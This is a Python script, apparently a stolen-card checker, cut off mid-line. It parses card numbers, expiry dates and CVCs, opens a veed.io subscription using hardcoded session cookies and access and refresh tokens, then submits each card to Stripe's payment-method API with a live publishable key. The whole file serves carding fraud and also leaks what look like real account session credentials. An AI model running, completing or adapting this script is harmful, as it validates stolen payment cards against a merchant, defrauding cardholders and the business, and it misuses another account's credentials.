import requests
def Tele(ccx):
	import requests
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:
		yy = yy.split("20")[1]
	r = requests.session()
	import requests
	import requests
	
	cookies = {
	    'VEED_LOCALE': 'en',
	    '_fbp': 'fb.1.1720168588115.50051504678877609',
	    '_ga': 'GA1.1.53937532.1720168590',
	    'intercom-id-j76wdp4u': '3a86b617-02b1-4dd2-8913-80b1167668ea',
	    'intercom-device-id-j76wdp4u': '869eedce-74d6-41b7-baac-833a9fa03475',
	    '__stripe_mid': '3688f5dc-04e3-49e9-9f6b-06b0de2638fbea3861',
	    'www_veed_io_refresh_token': 'jj5zNeyDWMnv5e4IgPUuRlKeAP7vVRxP',
	    'AMP_MKTG_47f1934446': 'JTdCJTdE',
	    'GCLB': 'CJy5j9fdkaW-zAEQAw',
	    'ph_phc_Wl8ChnwAGPJn8HE6ZcVBIvnmHXFZL4GcF94U0IV1DC8_posthog': '%7B%22distinct_id%22%3A%22fb09e1b1-3049-4cb0-a830-b82b196da5b0%22%2C%22%24sesid%22%3A%5B1720202373852%2C%220190840d-2adc-7cee-9d92-d002b8b96515%22%2C1720202373852%5D%7D',
	    'www_veed_io_user_meta': 'eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D',
	    'user_meta': 'eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D',
	    'www_veed_io_access_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0.FNJO9kK4d8CRhaGWAgpkATJ3QoEX06DKeVb17LsVvsq5z_TZ5u-N4CdeBUwJ8I1031zSxn5jlJu2v_wCF_0OSuC9yfkFHaKnhZvxPbHmmGV1vYnWo9iOiEX-_bi4giilsIvK45Fq6gsElgfV-Z0ZTCIONROWeB5brus6i73lQTUoqJH7cJ_QAjlUMSE0h2qCnnAKwNW42W4bixDHcgDvSal3o1d9p7Cg50iN79lmPVBQHDFYPzl6ovx61eGDkAto-sKU8oAMdT6fbur__kNgC0RSsKqtVi7WNLqMyqpTQgvxHrvvHIszvliHjp66OALBXLSCWsjcu4Sxi8RenHSbZ2oJGo0rhpnk31GpDK5jwYPzF0rGhNyAx-zqA-Z8zDqY1fjXbgK8I6kdZKOBtyE_xLf-TKYRbOI-l-HdEjeIesLml3iNmkg8-G1gBobW4YjmqyLM1rzxLBcxGiyhHMPiAxRS37IKM0cVC4zVGdiM_tmN5bdZRw9jjDABHFqQ6PZJ1QxDfW2PNEnp3lVXXat_drN6FOiLjh1dJWxKNQMfE_OPcrGdbBgT6tyJnHRhsFlG_b_-BmiTw9-J8P50JAiJJHQliHcccLel1GLZAEu_4SkZiFlmxvxUSMs1N8uFNKMbzsVPgvXKBHncH2fiLtsJAlOYm_n-CzwNlmqr7tjRbiY',
	    'ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%224b539700-4722-1d5e-a023-f358c7475640%22%2C%22c%22%3A1720168611936%2C%22l%22%3A1720202374527%7D',
	    'ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%22fb09e1b1-3049-4cb0-a830-b82b196da5b0%22%2C%22c%22%3A1720168611914%2C%22l%22%3A1720202374533%7D',
	    '_gcl_gs': '2.1.k1$i1720202372',
	    'OptanonConsent': 'isGpcEnabled=0&datestamp=Fri+Jul+05+2024+20%3A59%3A35+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d9c7c548-1e38-4476-afa1-5630669645f6&interactionCount=0&isAnonUser=1&landingPath=NotLandingPage&AwaitingReconsent=false&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1',
	    '_gcl_aw': 'GCL.1720202378.Cj0KCQjws560BhCuARIsAHMqE0Gv6fX6MGgEAR9tPxNUD7km8cFg7IMGZWqKUATKBOsbCNDekRiGA6QaApbnEALw_wcB',
	    'ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%2274adaec0-670a-3829-f94f-dfd5ce4554a0%22%2C%22e%22%3A1720204177697%2C%22c%22%3A1720202374520%2C%22l%22%3A1720202377697%7D',
	    '_gcl_au': '1.1.1518723751.1720168590.1135269138.1720202377.1720202377',
	    '__stripe_sid': '9c542508-2173-4bae-b35e-a99f7bc20b249f62df',
	    '_uetsid': 'aa6f45003aa911efbea679c2cc7fd749',
	    '_uetvid': 'aa6fdfa03aa911ef8187f57353e833fe',
	    '_ga_MDGG251D9T': 'GS1.1.1720202374.3.1.1720202445.60.0.0',
	    'intercom-session-j76wdp4u': 'VjZHcDMzK0FUSFkyWnRpNE5JWWl2dEpSNEU3ZXZFR2E3UWo0S0dQRWFRVGpmd3lIdDU0aVg0NDI1Z2J2UkpOcy0tUVdac3dpQmh2TEttNVlyRHlaTmlVZz09--bc111a1532eb51d05c6ed5bf9e9185765bcf96df',
	    'AMP_47f1934446': 'JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJlMWY0M2ZkYi0zM2FmLTRjY2YtOGVmZC1iODBjMzc2MDE2YzElMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJmYjA5ZTFiMS0zMDQ5LTRjYjAtYTgzMC1iODJiMTk2ZGE1YjAlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzIwMjAyMzczNzUyJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyMDIwMjQ1MTM1NCUyQyUyMmxhc3RFdmVudElkJTIyJTNBMzUlN0Q=',
	}
	
	headers = {
	    'authority': 'www.veed.io',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'billingaccountid': '8992caaa-3096-49de-8829-1cc6a027d1b0',
	    'content-type': 'application/json',
	    # 'cookie': 'VEED_LOCALE=en; _fbp=fb.1.1720168588115.50051504678877609; _ga=GA1.1.53937532.1720168590; intercom-id-j76wdp4u=3a86b617-02b1-4dd2-8913-80b1167668ea; intercom-device-id-j76wdp4u=869eedce-74d6-41b7-baac-833a9fa03475; __stripe_mid=3688f5dc-04e3-49e9-9f6b-06b0de2638fbea3861; www_veed_io_refresh_token=jj5zNeyDWMnv5e4IgPUuRlKeAP7vVRxP; AMP_MKTG_47f1934446=JTdCJTdE; GCLB=CJy5j9fdkaW-zAEQAw; ph_phc_Wl8ChnwAGPJn8HE6ZcVBIvnmHXFZL4GcF94U0IV1DC8_posthog=%7B%22distinct_id%22%3A%22fb09e1b1-3049-4cb0-a830-b82b196da5b0%22%2C%22%24sesid%22%3A%5B1720202373852%2C%220190840d-2adc-7cee-9d92-d002b8b96515%22%2C1720202373852%5D%7D; www_veed_io_user_meta=eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; user_meta=eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; www_veed_io_access_token=eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0.FNJO9kK4d8CRhaGWAgpkATJ3QoEX06DKeVb17LsVvsq5z_TZ5u-N4CdeBUwJ8I1031zSxn5jlJu2v_wCF_0OSuC9yfkFHaKnhZvxPbHmmGV1vYnWo9iOiEX-_bi4giilsIvK45Fq6gsElgfV-Z0ZTCIONROWeB5brus6i73lQTUoqJH7cJ_QAjlUMSE0h2qCnnAKwNW42W4bixDHcgDvSal3o1d9p7Cg50iN79lmPVBQHDFYPzl6ovx61eGDkAto-sKU8oAMdT6fbur__kNgC0RSsKqtVi7WNLqMyqpTQgvxHrvvHIszvliHjp66OALBXLSCWsjcu4Sxi8RenHSbZ2oJGo0rhpnk31GpDK5jwYPzF0rGhNyAx-zqA-Z8zDqY1fjXbgK8I6kdZKOBtyE_xLf-TKYRbOI-l-HdEjeIesLml3iNmkg8-G1gBobW4YjmqyLM1rzxLBcxGiyhHMPiAxRS37IKM0cVC4zVGdiM_tmN5bdZRw9jjDABHFqQ6PZJ1QxDfW2PNEnp3lVXXat_drN6FOiLjh1dJWxKNQMfE_OPcrGdbBgT6tyJnHRhsFlG_b_-BmiTw9-J8P50JAiJJHQliHcccLel1GLZAEu_4SkZiFlmxvxUSMs1N8uFNKMbzsVPgvXKBHncH2fiLtsJAlOYm_n-CzwNlmqr7tjRbiY; ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%224b539700-4722-1d5e-a023-f358c7475640%22%2C%22c%22%3A1720168611936%2C%22l%22%3A1720202374527%7D; ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%22fb09e1b1-3049-4cb0-a830-b82b196da5b0%22%2C%22c%22%3A1720168611914%2C%22l%22%3A1720202374533%7D; _gcl_gs=2.1.k1$i1720202372; OptanonConsent=isGpcEnabled=0&datestamp=Fri+Jul+05+2024+20%3A59%3A35+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d9c7c548-1e38-4476-afa1-5630669645f6&interactionCount=0&isAnonUser=1&landingPath=NotLandingPage&AwaitingReconsent=false&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1; _gcl_aw=GCL.1720202378.Cj0KCQjws560BhCuARIsAHMqE0Gv6fX6MGgEAR9tPxNUD7km8cFg7IMGZWqKUATKBOsbCNDekRiGA6QaApbnEALw_wcB; ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5=%7B%22g%22%3A%2274adaec0-670a-3829-f94f-dfd5ce4554a0%22%2C%22e%22%3A1720204177697%2C%22c%22%3A1720202374520%2C%22l%22%3A1720202377697%7D; _gcl_au=1.1.1518723751.1720168590.1135269138.1720202377.1720202377; __stripe_sid=9c542508-2173-4bae-b35e-a99f7bc20b249f62df; _uetsid=aa6f45003aa911efbea679c2cc7fd749; _uetvid=aa6fdfa03aa911ef8187f57353e833fe; _ga_MDGG251D9T=GS1.1.1720202374.3.1.1720202445.60.0.0; intercom-session-j76wdp4u=VjZHcDMzK0FUSFkyWnRpNE5JWWl2dEpSNEU3ZXZFR2E3UWo0S0dQRWFRVGpmd3lIdDU0aVg0NDI1Z2J2UkpOcy0tUVdac3dpQmh2TEttNVlyRHlaTmlVZz09--bc111a1532eb51d05c6ed5bf9e9185765bcf96df; AMP_47f1934446=JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJlMWY0M2ZkYi0zM2FmLTRjY2YtOGVmZC1iODBjMzc2MDE2YzElMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJmYjA5ZTFiMS0zMDQ5LTRjYjAtYTgzMC1iODJiMTk2ZGE1YjAlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzIwMjAyMzczNzUyJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyMDIwMjQ1MTM1NCUyQyUyMmxhc3RFdmVudElkJTIyJTNBMzUlN0Q=',
	    'origin': 'https://www.veed.io',
	    'referer': 'https://www.veed.io/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-origin',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	json_data = {
	    'cadence': 'MONTHLY',
	    'plan': 'BASIC',
	    'quantity': 1,
	    'planPriceId': '2d23bd7b-1014-4b34-a181-1da8bc4b51dc',
	    'currency': 'USD',
	    'metadata': {
	        'impact_click_id': '',
	    },
	}
	
	response = requests.post('https://www.veed.io/api/v1/subscriptions', cookies=cookies, headers=headers, json=json_data)
	
	# Note: json_data will not be serialized by requests
	# exactly as it was in the original request.
	#data = '{"cadence":"MONTHLY","plan":"BASIC","quantity":1,"planPriceId":"2d23bd7b-1014-4b34-a181-1da8bc4b51dc","currency":"USD","metadata":{"impact_click_id":""}}'
	#response = requests.post('https://www.veed.io/api/v1/subscriptions', cookies=cookies, headers=headers, data=data)
	ids=(response.json()['data']['id'])
	headers = {
	    'authority': 'api.stripe.com',
	    'accept': 'application/json',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/x-www-form-urlencoded',
	    'origin': 'https://js.stripe.com',
	    'referer': 'https://js.stripe.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'same-site',
	    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
	}
	
	data = f'billing_details[name]=&billing_details[address][country]=EG&type=card&card[number]={n}&card[cvc]={cvc}&card[exp_year]={yy}&card[exp_month]={mm}&&allow_redisplay=unspecified&pasted_fields=number&payment_user_agent=stripe.js%2Ffe2e2c5c10%3B+stripe-js-v3%2Ffe2e2c5c10%3B+payment-element&referrer=https%3A%2F%2Fwww.veed.io&time_on_page=28285&client_attribution_metadata[client_session_id]=49f3bfef-537b-4055-95c6-b922a02b46b4&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=standard&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&guid=dfb99631-2f0e-45da-ad38-01e211136b5b52c809&muid=3688f5dc-04e3-49e9-9f6b-06b0de2638fbea3861&sid=3b4cb96f-2e39-427e-bb4c-49122a984e9ac99ec2&key=pk_live_l1BFAH6I4rWpV6dIqwAZxy3f'
	
	response = requests.post('https://api.stripe.com/v1/payment_methods', headers=headers, data=data)
	id=(response.json()['id'])
	import requests
	
	cookies = {
	    'VEED_LOCALE': 'en',
	    '_fbp': 'fb.1.1720168588115.50051504678877609',
	    '_ga': 'GA1.1.53937532.1720168590',
	    'intercom-id-j76wdp4u': '3a86b617-02b1-4dd2-8913-80b1167668ea',
	    'intercom-device-id-j76wdp4u': '869eedce-74d6-41b7-baac-833a9fa03475',
	    '__stripe_mid': '3688f5dc-04e3-49e9-9f6b-06b0de2638fbea3861',
	    'www_veed_io_refresh_token': 'jj5zNeyDWMnv5e4IgPUuRlKeAP7vVRxP',
	    'AMP_MKTG_47f1934446': 'JTdCJTdE',
	    'GCLB': 'CJy5j9fdkaW-zAEQAw',
	    'ph_phc_Wl8ChnwAGPJn8HE6ZcVBIvnmHXFZL4GcF94U0IV1DC8_posthog': '%7B%22distinct_id%22%3A%22fb09e1b1-3049-4cb0-a830-b82b196da5b0%22%2C%22%24sesid%22%3A%5B1720202373852%2C%220190840d-2adc-7cee-9d92-d002b8b96515%22%2C1720202373852%5D%7D',
	    'www_veed_io_user_meta': 'eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D',
	    'user_meta': 'eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D',
	    'www_veed_io_access_token': 'eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0.FNJO9kK4d8CRhaGWAgpkATJ3QoEX06DKeVb17LsVvsq5z_TZ5u-N4CdeBUwJ8I1031zSxn5jlJu2v_wCF_0OSuC9yfkFHaKnhZvxPbHmmGV1vYnWo9iOiEX-_bi4giilsIvK45Fq6gsElgfV-Z0ZTCIONROWeB5brus6i73lQTUoqJH7cJ_QAjlUMSE0h2qCnnAKwNW42W4bixDHcgDvSal3o1d9p7Cg50iN79lmPVBQHDFYPzl6ovx61eGDkAto-sKU8oAMdT6fbur__kNgC0RSsKqtVi7WNLqMyqpTQgvxHrvvHIszvliHjp66OALBXLSCWsjcu4Sxi8RenHSbZ2oJGo0rhpnk31GpDK5jwYPzF0rGhNyAx-zqA-Z8zDqY1fjXbgK8I6kdZKOBtyE_xLf-TKYRbOI-l-HdEjeIesLml3iNmkg8-G1gBobW4YjmqyLM1rzxLBcxGiyhHMPiAxRS37IKM0cVC4zVGdiM_tmN5bdZRw9jjDABHFqQ6PZJ1QxDfW2PNEnp3lVXXat_drN6FOiLjh1dJWxKNQMfE_OPcrGdbBgT6tyJnHRhsFlG_b_-BmiTw9-J8P50JAiJJHQliHcccLel1GLZAEu_4SkZiFlmxvxUSMs1N8uFNKMbzsVPgvXKBHncH2fiLtsJAlOYm_n-CzwNlmqr7tjRbiY',
	    'ab.storage.deviceId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%224b539700-4722-1d5e-a023-f358c7475640%22%2C%22c%22%3A1720168611936%2C%22l%22%3A1720202374527%7D',
	    'ab.storage.userId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%22fb09e1b1-3049-4cb0-a830-b82b196da5b0%22%2C%22c%22%3A1720168611914%2C%22l%22%3A1720202374533%7D',
	    '_gcl_gs': '2.1.k1$i1720202372',
	    'OptanonConsent': 'isGpcEnabled=0&datestamp=Fri+Jul+05+2024+20%3A59%3A35+GMT%2B0300+(%D8%AA%D9%88%D9%82%D9%8A%D8%AA+%D8%B4%D8%B1%D9%82+%D8%A3%D9%88%D8%B1%D9%88%D8%A8%D8%A7+%D8%A7%D9%84%D8%B5%D9%8A%D9%81%D9%8A)&version=202404.1.0&browserGpcFlag=0&isIABGlobal=false&hosts=&consentId=d9c7c548-1e38-4476-afa1-5630669645f6&interactionCount=0&isAnonUser=1&landingPath=NotLandingPage&AwaitingReconsent=false&groups=C0001%3A1%2CC0002%3A1%2CC0004%3A1',
	    '_gcl_aw': 'GCL.1720202378.Cj0KCQjws560BhCuARIsAHMqE0Gv6fX6MGgEAR9tPxNUD7km8cFg7IMGZWqKUATKBOsbCNDekRiGA6QaApbnEALw_wcB',
	    'ab.storage.sessionId.5efd8ea1-77f5-4018-ab94-d683b7e727e5': '%7B%22g%22%3A%2274adaec0-670a-3829-f94f-dfd5ce4554a0%22%2C%22e%22%3A1720204177697%2C%22c%22%3A1720202374520%2C%22l%22%3A1720202377697%7D',
	    '_gcl_au': '1.1.1518723751.1720168590.1135269138.1720202377.1720202377',
	    '__stripe_sid': '9c542508-2173-4bae-b35e-a99f7bc20b249f62df',
	    '_uetsid': 'aa6f45003aa911efbea679c2cc7fd749',
	    '_uetvid': 'aa6fdfa03aa911ef8187f57353e833fe',
	    '_ga_MDGG251D9T': 'GS1.1.1720202374.3.1.1720202445.60.0.0',
	    'intercom-session-j76wdp4u': 'VjZHcDMzK0FUSFkyWnRpNE5JWWl2dEpSNEU3ZXZFR2E3UWo0S0dQRWFRVGpmd3lIdDU0aVg0NDI1Z2J2UkpOcy0tUVdac3dpQmh2TEttNVlyRHlaTmlVZz09--bc111a1532eb51d05c6ed5bf9e9185765bcf96df',
	    'AMP_47f1934446': 'JTdCJTIyZGV2aWNlSWQlMjIlM0ElMjJlMWY0M2ZkYi0zM2FmLTRjY2YtOGVmZC1iODBjMzc2MDE2YzElMjIlMkMlMjJ1c2VySWQlMjIlM0ElMjJmYjA5ZTFiMS0zMDQ5LTRjYjAtYTgzMC1iODJiMTk2ZGE1YjAlMjIlMkMlMjJzZXNzaW9uSWQlMjIlM0ExNzIwMjAyMzczNzUyJTJDJTIyb3B0T3V0JTIyJTNBZmFsc2UlMkMlMjJsYXN0RXZlbnRUaW1lJTIyJTNBMTcyMDIwMjQ2NjA4NyUyQyUyMmxhc3RFdmVudElkJTIyJTNBMzclN0Q=',
	}
	
	headers = {
	    'authority': 'www.veed.io',
	    'accept': '*/*',
	    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
	    'content-type': 'application/json',
	    # 'cookie': 'VEED_LOCALE=en; _fbp=fb.1.1720168588115.50051504678877609; _ga=GA1.1.53937532.1720168590; intercom-id-j76wdp4u=3a86b617-02b1-4dd2-8913-80b1167668ea; intercom-device-id-j76wdp4u=869eedce-74d6-41b7-baac-833a9fa03475; __stripe_mid=3688f5dc-04e3-49e9-9f6b-06b0de2638fbea3861; www_veed_io_refresh_token=jj5zNeyDWMnv5e4IgPUuRlKeAP7vVRxP; AMP_MKTG_47f1934446=JTdCJTdE; GCLB=CJy5j9fdkaW-zAEQAw; ph_phc_Wl8ChnwAGPJn8HE6ZcVBIvnmHXFZL4GcF94U0IV1DC8_posthog=%7B%22distinct_id%22%3A%22fb09e1b1-3049-4cb0-a830-b82b196da5b0%22%2C%22%24sesid%22%3A%5B1720202373852%2C%220190840d-2adc-7cee-9d92-d002b8b96515%22%2C1720202373852%5D%7D; www_veed_io_user_meta=eyJleHAiOjE3MjAyMDMyNzQsImlhdCI6MTcyMDIwMjM3NCwic3ViIjoiZmIwOWUxYjEtMzA0OS00Y2IwLWE4MzAtYjgyYjE5NmRhNWIwIiwicm9sZXMiOlsiVVNFUiJdLCJraWQiOiJwcm9qZWN0cy92ZWVkLXByb2Qtc2VydmVyL2xvY2F0aW9ucy9ldXJvcGUtd2VzdDEva2V5UmluZ3MvdmVlZC1wcm9kLWtleXJpbmcvY3J5cHRvS2V5cy92ZWVkLXByb2QtandrLWtleS9jcnlwdG9LZXlWZXJzaW9ucy8xIiwiZmVhdHVyZXMiOnsibGl2ZUVuYWJsZWQiOnRydWUsImNyZWF0ZU5ld1Byb2plY3RzV2l0aE1pZ3JhdGVkU3VidGl0bGVzIjp0cnVlfSwic2NvcGVzIjpbXX0%3D; 